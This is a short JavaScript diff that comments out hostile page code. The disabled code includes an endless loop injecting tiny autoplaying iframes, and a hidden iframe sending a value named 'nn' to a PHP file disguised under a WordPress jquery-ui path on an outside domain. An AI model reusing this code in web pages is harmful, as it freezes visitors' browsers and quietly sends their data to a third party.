@@ -7,15 +7,15 @@ if(nn == "") {
 	//window.location = "https://akk.li/pics/anne/jpg";
 	//window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
 	//$("body").append("<h1 style='position:absolute;top:200px;left:200px;'>HAIL SATAN</h1>");
-	while(true) {
+//	while(true) {
 	//	window.open("https://akk.li/pics/anne/jpg");
 //$("body").append("<h1 style='position:absolute;top:200px;left:200px;visibility:hidden'></h1>");
-$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/l9P6WqbSFGU?autoplay=1" frameborder="0" allowfullscreen></iframe>');
-	}
+//$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/l9P6WqbSFGU?autoplay=1" frameborder="0" allowfullscreen></iframe>');
+//	}
 //
 
 } else {
-	console.log("...");
+//	console.log("...");
 }
 
 //
@@ -28,6 +28,6 @@ $("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embe
 
 //else {
    //window.location = "";
-// }
+//// }
  $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-   .appendTo('#overlays');
+  // .appendTo('#overlays');
